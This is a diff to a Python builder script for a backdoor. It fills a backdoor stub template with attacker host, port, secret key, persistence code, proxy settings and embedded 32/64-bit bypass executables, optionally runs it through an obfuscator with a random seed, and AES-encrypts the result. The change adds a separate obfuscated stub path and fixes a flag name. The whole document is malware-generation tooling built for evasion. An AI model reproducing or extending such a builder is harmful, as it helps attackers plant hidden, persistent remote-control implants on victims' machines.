@@ -86,15 +86,18 @@ with open('base64/86', 'rb') as exe86:
 with open('base64/64', 'rb') as exe64:
 	bypass64 = "bypass64exe = '%s'" % (exe64.read())
 
-with open('stubs/backdoor.py', 'rb') as finalbackdoor:
-	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
-
-if args.obsfuscate:
+if args.obfuscate:
+	with open('stubs/backdoor_obfs.py', 'rb') as finalbackdoor:
+		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
 	with open('tempobfs.py', 'wb') as o:
 		o.write(readyscript)
 	obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	readyscript = obstime.stdout.read()
 	os.remove('tempobfs.py')
+else:
+	with open('stubs/backdoor.py', 'rb') as finalbackdoor:
+		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
+
 
 cipher = AES.new(key)
 encrypted = EncodeAES(cipher, readyscript)
